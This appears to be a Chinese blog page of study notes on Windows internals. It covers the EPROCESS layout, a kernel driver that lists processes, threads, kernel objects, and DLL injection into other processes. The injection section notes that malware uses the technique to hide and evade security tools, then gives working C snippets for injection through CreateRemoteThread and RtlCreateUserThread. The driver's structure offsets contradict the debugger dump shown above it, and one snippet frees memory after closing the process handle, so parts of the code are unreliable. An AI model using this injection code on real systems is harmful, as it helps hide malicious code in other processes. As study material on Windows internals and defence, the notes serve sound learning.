<li>缓冲（spooler）服务是管理缓冲池中的打印和传真作业，将文件加载到内存中以便迟后打印（系统服务）。</li>
<li>System Idle Process 这个进程在系统不 处理其它线程的时 候分派处理器的时间。</li>
</ol>
<p>DLL 再注入时必须要有 DLLENTRYPoint</p>
<h3 id="进程对象"><a class="markdownIt-Anchor" href="#进程对象">#</a> 进程对象</h3>
<p>对于进程来说，首先要说的数据结构是 EPROCESS（执行体进程块），它在执行体内表示一个进程对象。 我们可以通过内核调试器看看这个数据结构在 WRK 中的样子。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; ?? sizeof(EPROCESS)</span><br><span class="line"></span><br><span class="line">unsigned int 0x278</span><br><span class="line"></span><br><span class="line">kd&gt; dt _EPROCESS</span><br><span class="line"></span><br><span class="line">nt!EPROCESS</span><br><span class="line"></span><br><span class="line">+0x000 Pcb : _KPROCESS</span><br><span class="line"></span><br><span class="line">+0x078 ProcessLock : _EX_PUSH_LOCK</span><br><span class="line"></span><br><span class="line">+0x080 CreateTime : _LARGE_INTEGER</span><br><span class="line"></span><br><span class="line">+0x088 ExitTime : _LARGE_INTEGER</span><br><span class="line"></span><br><span class="line">+0x090 RundownProtect : _EX_RUNDOWN_REF</span><br><span class="line"></span><br><span class="line">+0x094 UniqueProcessId : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x098 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line"></span><br><span class="line">+0x0a0 QuotaUsage : [3] Uint4B</span><br><span class="line"></span><br><span class="line">+0x0ac QuotaPeak : [3] Uint4B</span><br><span class="line"></span><br><span class="line">+0x0b8 CommitCharge : Uint4B</span><br><span class="line"></span><br><span class="line">+0x0bc PeakVirtualSize : Uint4B</span><br><span class="line"></span><br><span class="line">+0x0c0 VirtualSize : Uint4B</span><br><span class="line"></span><br><span class="line">+0x0c4 SessionProcessLinks : _LIST_ENTRY</span><br><span class="line"></span><br><span class="line">+0x0cc DebugPort : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x0d0 ExceptionPort : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x0d4 ObjectTable : Ptr32 _HANDLE_TABLE</span><br><span class="line"></span><br><span class="line">+0x0d8 Token : _EX_FAST_REF</span><br><span class="line"></span><br><span class="line">+0x0dc WorkingSetPage : Uint4B</span><br><span class="line"></span><br><span class="line">+0x0e0 AddressCreationLock : _KGUARDED_MUTEX</span><br><span class="line"></span><br><span class="line">+0x100 HyperSpaceLock : Uint4B</span><br><span class="line"></span><br><span class="line">+0x104 ForkInProgress : Ptr32 _ETHREAD</span><br><span class="line"></span><br><span class="line">+0x108 HardwareTrigger : Uint4B</span><br><span class="line"></span><br><span class="line">+0x10c PhysicalVadRoot : Ptr32 _MM_AVL_TABLE</span><br><span class="line"></span><br><span class="line">+0x110 CloneRoot : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x114 NumberOfPrivatePages : Uint4B</span><br><span class="line"></span><br><span class="line">+0x118 NumberOfLockedPages : Uint4B</span><br><span class="line"></span><br><span class="line">+0x11c Win32Process : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x120 Job : Ptr32 _EJOB</span><br><span class="line"></span><br><span class="line">+0x124 SectionObject : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x128 SectionBaseAddress : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x12c QuotaBlock : Ptr32 _EPROCESS_QUOTA_BLOCK</span><br><span class="line"></span><br><span class="line">+0x130 WorkingSetWatch : Ptr32 _PAGEFAULT_HISTORY</span><br><span class="line"></span><br><span class="line">+0x134 Win32WindowStation : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x138 InheritedFromUniqueProcessId : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x13c LdtInformation : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x140 VadFreeHint : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x144 VdmObjects : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x148 DeviceMap : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x14c Spare0 : [3] Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x158 PageDirectoryPte : _HARDWARE_PTE_X86</span><br><span class="line"></span><br><span class="line">+0x158 Filler : Uint8B</span><br><span class="line"></span><br><span class="line">+0x160 Session : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x164 ImageFileName : [16] UChar</span><br><span class="line"></span><br><span class="line">+0x174 JobLinks : _LIST_ENTRY</span><br><span class="line"></span><br><span class="line">+0x17c LockedPagesList : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x180 ThreadListHead : _LIST_ENTRY</span><br><span class="line"></span><br><span class="line">+0x188 SecurityPort : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x18c PaeTop : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x190 ActiveThreads : Uint4B</span><br><span class="line"></span><br><span class="line">+0x194 GrantedAccess : Uint4B</span><br><span class="line"></span><br><span class="line">+0x198 DefaultHardErrorProcessing : Uint4B</span><br><span class="line"></span><br><span class="line">+0x19c LastThreadExitStatus : Int4B</span><br><span class="line"></span><br><span class="line">+0x1a0 Peb : Ptr32 _PEB</span><br><span class="line"></span><br><span class="line">+0x1a4 PrefetchTrace : _EX_FAST_REF</span><br><span class="line"></span><br><span class="line">+0x1a8 ReadOperationCount : _LARGE_INTEGER</span><br><span class="line"></span><br><span class="line">+0x1b0 WriteOperationCount : _LARGE_INTEGER</span><br><span class="line"></span><br><span class="line">+0x1b8 OtherOperationCount : _LARGE_INTEGER</span><br><span class="line"></span><br><span class="line">+0x1c0 ReadTransferCount : _LARGE_INTEGER</span><br><span class="line"></span><br><span class="line">+0x1c8 WriteTransferCount : _LARGE_INTEGER</span><br><span class="line"></span><br><span class="line">+0x1d0 OtherTransferCount : _LARGE_INTEGER</span><br><span class="line"></span><br><span class="line">+0x1d8 CommitChargeLimit : Uint4B</span><br><span class="line"></span><br><span class="line">+0x1dc CommitChargePeak : Uint4B</span><br><span class="line"></span><br><span class="line">+0x1e0 AweInfo : Ptr32 Void</span><br><span class="line"></span><br><span class="line">+0x1e4 SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO</span><br><span class="line"></span><br><span class="line">+0x1e8 Vm : _MMSUPPORT</span><br><span class="line"></span><br><span class="line">+0x230 MmProcessLinks : _LIST_ENTRY</span><br><span class="line"></span><br><span class="line">+0x238 ModifiedPageCount : Uint4B</span><br><span class="line"></span><br><span class="line">+0x23c JobStatus : Uint4B</span><br><span class="line"></span><br><span class="line">+0x240 Flags : Uint4B</span><br><span class="line"></span><br><span class="line">+0x240 CreateReported : Pos 0, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 NoDebugInherit : Pos 1, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 ProcessExiting : Pos 2, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 ProcessDelete : Pos 3, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 Wow64SplitPages : Pos 4, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 VmDeleted : Pos 5, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 OutswapEnabled : Pos 6, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 Outswapped : Pos 7, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 ForkFailed : Pos 8, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 Wow64VaSpace4Gb : Pos 9, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 AddressSpaceInitialized : Pos 10, 2 Bits</span><br><span class="line"></span><br><span class="line">+0x240 SetTimerResolution : Pos 12, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 BreakOnTermination : Pos 13, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 SessionCreationUnderway : Pos 14, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 WriteWatch : Pos 15, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 ProcessInSession : Pos 16, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 OverrideAddressSpace : Pos 17, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 HasAddressSpace : Pos 18, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 LaunchPrefetched : Pos 19, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 InjectInpageErrors : Pos 20, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 VmTopDown : Pos 21, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 ImageNotifyDone : Pos 22, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 PdeUpdateNeeded : Pos 23, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 VdmAllowed : Pos 24, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 SmapAllowed : Pos 25, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 CreateFailed : Pos 26, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 DefaultIoPriority : Pos 27, 3 Bits</span><br><span class="line"></span><br><span class="line">+0x240 Spare1 : Pos 30, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x240 Spare2 : Pos 31, 1 Bit</span><br><span class="line"></span><br><span class="line">+0x244 ExitStatus : Int4B</span><br><span class="line"></span><br><span class="line">+0x248 NextPageColor : Uint2B</span><br><span class="line"></span><br><span class="line">+0x24a SubSystemMinorVersion : UChar</span><br><span class="line"></span><br><span class="line">+0x24b SubSystemMajorVersion : UChar</span><br><span class="line"></span><br><span class="line">+0x24a SubSystemVersion : Uint2B</span><br><span class="line"></span><br><span class="line">+0x24c PriorityClass : UChar</span><br><span class="line"></span><br><span class="line">+0x250 VadRoot : _MM_AVL_TABLE</span><br><span class="line"></span><br><span class="line">+0x270 Cookie : Uint4B</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">思路，先通过EPROCESS找到PsActiveProcessLinks，然后遍历所有进程，进程名在ImageFileName</span><br><span class="line">*/</span><br><span class="line">#include &lt;ntddk.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTSTATUS TraverseProcess()</span><br><span class="line">&#123;</span><br><span class="line">	UCHAR *eprocess = (UCHAR *)PsGetCurrentProcess();//获取了EPROCESS的指针 PsActiveProcessLinks在offset0x088处</span><br><span class="line">	LIST_ENTRY *pFirstEntry = (LIST_ENTRY *)((UCHAR *)eprocess + 0x88);//获取PsActiveProcessLinks的指针</span><br><span class="line">	LIST_ENTRY *activeList = pFirstEntry;</span><br><span class="line">	UCHAR ImageFileName[16];</span><br><span class="line">	memset(ImageFileName, 0, sizeof(ImageFileName));</span><br><span class="line"></span><br><span class="line">	DbgPrint(&quot;address of EPROCESS : %X&quot;, eprocess);</span><br><span class="line"></span><br><span class="line">	do &#123;</span><br><span class="line">		memcpy(ImageFileName, (UCHAR *)eprocess + 0x174, sizeof(ImageFileName));</span><br><span class="line">		DbgPrint(&quot;%s, %x, %x&quot;, ImageFileName,activeList-&gt;Flink,activeList-&gt;Blink);</span><br><span class="line">		activeList = activeList-&gt;Flink;//寻址到下一个链表的表头</span><br><span class="line">		eprocess = (UCHAR *)activeList - 0x88;</span><br><span class="line">	&#125; while (pFirstEntry-&gt;Flink != activeList-&gt;Flink);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void Unload(PDRIVER_OBJECT pDriverObject)</span><br><span class="line">&#123;</span><br><span class="line">	UNREFERENCED_PARAMETER(pDriverObject);</span><br><span class="line">	DbgPrint(&quot;unloading...&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING registryPath)</span><br><span class="line">&#123;</span><br><span class="line">	UNREFERENCED_PARAMETER(pDriverObj);</span><br><span class="line">	UNREFERENCED_PARAMETER(registryPath);</span><br><span class="line">	UNICODE_STRING success = RTL_CONSTANT_STRING(L&quot;success&quot;);</span><br><span class="line">	UNICODE_STRING fail = RTL_CONSTANT_STRING(L&quot;failed&quot;);</span><br><span class="line">	if (TraverseProcess()) &#123;</span><br><span class="line">		DbgPrint(&quot;%wZ&quot;, &amp;success);</span><br><span class="line">	&#125;</span><br><span class="line">	pDriverObj-&gt;DriverUnload = Unload;</span><br><span class="line">	DbgPrint(&quot;%wZ&quot;, &amp;fail);</span><br><span class="line">	return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="线程"><a class="markdownIt-Anchor" href="#线程">#</a> 线程</h3>
<ol>
<li>
<p>线程的创建其实和进程类似，也是建立起来线程的执行环境，比如分配线程所需要的数据结构和调用栈，完成这些数据结构的初始化操作。虽然这些操作比较于进程是很轻量级的，但是频繁创建和销毁也会是不可忽视的消耗。所以当需要频繁创建和销毁线程的时候，可以考虑线程池式的方式来解决消耗过大的问题。</p>
<p>进程中的多个线程执行的时候，是乱序的，即在某个时刻执行哪个线程，是不确定的，所以多线程的问题会比较难以调试。对于线程来说，是有用户态和内核态的区别，当进行线程切换的时候，如果线程是用户态，是需要切换为内核态的，这种切换也是需要耗费资源，不过目前随着硬件的发展，这部分切换的成本正在减少，所以，这部分的开销是可以接受的，大部分情况下，我们可以忽略线程的切换。</p>
</li>
<li></li>
</ol>
<p>一个多线程程序有多个执行点，在多处理器的机器上，不同的线程会真的存在；而在单处理器的机器上，系统采用一种分时技术来将每个线程切割成较短的时间间隔，一个线程执行时便暂停其它线程，给每个线程一些处理时间，这些时间是非常短的，在用户看来就像是程序支持多线程操作。</p>
<p>因为有了多线程，所以我们可以一边听音乐，一边编辑文档，或是一边聊微信。</p>
<p>若一个程序不支持多线程，当用户执行一个操作，若有别的操作还在运行，程序便会出现无响应，程序不应该允许这种情况发生。</p>
<p>但是线程一旦共享资源就会出现同步问题，因为任何线程都会被其它线程中断，所以使用线程并不难，重点是是如何同步对象来安全的共享资源。</p>
<p>!teb   查看线程环境链</p>
<h3 id="内核"><a class="markdownIt-Anchor" href="#内核">#</a> 内核</h3>
<ol>
<li>对象是一种特殊的数据结构，用于定于受保护的实体。为了让系统高效稳定的运行，在 Windows 内核中空间中保存了多种不同的对象。例如：在用户层使用 CreateProcess 创建进程以后，Windows 系统就会在内核中创建一个进程对象用来保存进程的信息（进程名，PID 等等），有了这些信息 Windows 就可以方便的对进程进行管理。这些内核对象是保存在内核空间中的，用户层的程序是无法通过地址直接访问这些对象。想要访问这些内核对象，就需要使用 Windows 提供的句柄。在用户层如果想做什么样的操作，就可以通过句柄进行操作，因为在内核层会通过该句柄找到相应的内核对象完成操作。通过这样的设计，用户层的代码就无法直接内核层的数据，对重要的数据的一些关键操作就会由内核来完成，增强了系统的健壮性。</li>
<li>对象管理器是执行体的组件，主要管理执行体对象。但是，执行体对象也可能封装了一个或多个内核对象。因此，Windows 对象管理器的作用可以认为是对内核空间中多种多样的不同内核对象进行控制。</li>
</ol>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/432ea42769ff4225b6a3eb7a4b83692f.jpg" alt="img"></p>
<p>内核是从 0x80000000 开始 ，0x7fffffff 之前的是用户态空间</p>
<h3 id="进程注入"><a class="markdownIt-Anchor" href="#进程注入">#</a> 进程注入</h3>
<p>Windows 平台下的进程注入技术一直以来都是一个被人深入研究的话题，并且目前已经拥有许多技术去将数据从一个进程注入到其他进程当中。恶意代码是最常用这种技术去进行敏感操作，以达到隐藏自身，绕过安全产品检测的目的。为了能够全面了解这项技术，曾经在某大会上所讨论的一个主题，该主题包含了尽可能所有的已知并且在当前环境 (Win10) 下可用的注入技术，并进行了总结</p>
<p>隐藏自身  隐藏敏感操作</p>
<p>CFG Windows 漏洞缓解措施，在 call eax 之前加个验证</p>
<p>call __security_init_cookie  防溢出</p>
<h4 id="createremotethread"><a class="markdownIt-Anchor" href="#createremotethread">#</a> CreateRemoteThread</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">DWORD dwSize = (lstrlenW(pszLibFile) + 1) * sizeof(wchar_t);</span><br><span class="line"> </span><br><span class="line">    // 获取传递进程ID的进程句柄</span><br><span class="line">    HANDLE hProcess = OpenProcess(</span><br><span class="line">        PROCESS_QUERY_INFORMATION |</span><br><span class="line">        PROCESS_CREATE_THREAD |</span><br><span class="line">        PROCESS_VM_OPERATION |</span><br><span class="line">        PROCESS_VM_WRITE,//目标进程的四个权限</span><br><span class="line">        FALSE, dwProcessId);</span><br><span class="line"> </span><br><span class="line">    // 在远程进程中为路径名分配空间</span><br><span class="line">    LPVOID pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    // 将DLL的路径名复制到远程进程地址空间</span><br><span class="line">    //pszLibFile：要注入的dll的路径  pathname</span><br><span class="line">    DWORD n = WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID)pszLibFile, dwSize, NULL);</span><br><span class="line"> </span><br><span class="line">    //在Kernel32.dll中获取LoadLibraryW的实际地址</span><br><span class="line">    PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32&quot;)), &quot;LoadLibraryW&quot;);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    //创建一个调用LoadLibraryW（DLLPathname）的远程线程</span><br><span class="line">    // CreateRemoteThread(目标进程句柄，NULL，0，线程函数指针，线程函数参数，0，NULL)</span><br><span class="line">    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, pszLibFileRemote, 0, NULL);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    // 等待远程线程终止</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"> </span><br><span class="line">    // 释放包含DLL路径名的远程内存并关闭句柄</span><br><span class="line">    if (pszLibFileRemote != NULL) //开辟的内存已经注入进数据</span><br><span class="line">        VirtualFreeEx(hProcess, pszLibFileRemote, 0, MEM_RELEASE);</span><br><span class="line">    //关闭线程和进程函数句柄</span><br><span class="line">    if (hThread != NULL)</span><br><span class="line">        CloseHandle(hThread);</span><br><span class="line"> </span><br><span class="line">    if (hProcess != NULL)</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line"> </span><br><span class="line">    return(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键函数：</p>
<p>VirtualAllocEx</p>
<p>WriteProcessMemory</p>
<p>GetProcAddress</p>
<p>CreateRemoteThread</p>
<h4 id="rtlcreateuserthread类型注入"><a class="markdownIt-Anchor" href="#rtlcreateuserthread类型注入">#</a> RtlCreateUserThread 类型注入</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    LPVOID LoadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    RtlCreateUserThread = (pRtlCreateUserThread)GetProcAddress(GetModuleHandle(L&quot;ntdll.dll&quot;), &quot;RtlCreateUserThread&quot;);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">#ifdef _DEBUG</span><br><span class="line">    wprintf(TEXT(&quot;[+] Found at 0x%08x\n&quot;), (UINT)RtlCreateUserThread);</span><br><span class="line">    wprintf(TEXT(&quot;[+] Found at 0x%08x\n&quot;), (UINT)LoadLibraryAddress);</span><br><span class="line">#endif</span><br><span class="line"> </span><br><span class="line">    DWORD dwSize = (wcslen(pszLibFile) + 1) * sizeof(wchar_t);</span><br><span class="line"> </span><br><span class="line">    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    BOOL bStatus = WriteProcessMemory(hProcess, lpBaseAddress, pszLibFile, dwSize, NULL);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    bStatus = (BOOL)RtlCreateUserThread(</span><br><span class="line">        hProcess,</span><br><span class="line">        NULL,</span><br><span class="line">        0,</span><br><span class="line">        0,</span><br><span class="line">        0,</span><br><span class="line">        0,</span><br><span class="line">        LoadLibraryAddress,</span><br><span class="line">        lpBaseAddress,</span><br><span class="line">        &amp;hRemoteThread,</span><br><span class="line">        NULL);</span><br><span class="line">    if (bStatus &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(TEXT(&quot;[-] Error: RtlCreateUserThread failed\n&quot;));</span><br><span class="line">        return(1);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(TEXT(&quot;[+] Remote thread has been created successfully ...\n&quot;));</span><br><span class="line">        WaitForSingleObject(hRemoteThread, INFINITE);</span><br><span class="line"> </span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        VirtualFreeEx(hProcess, lpBaseAddress, dwSize, MEM_RELEASE);</span><br><span class="line">        return(0);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    return(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
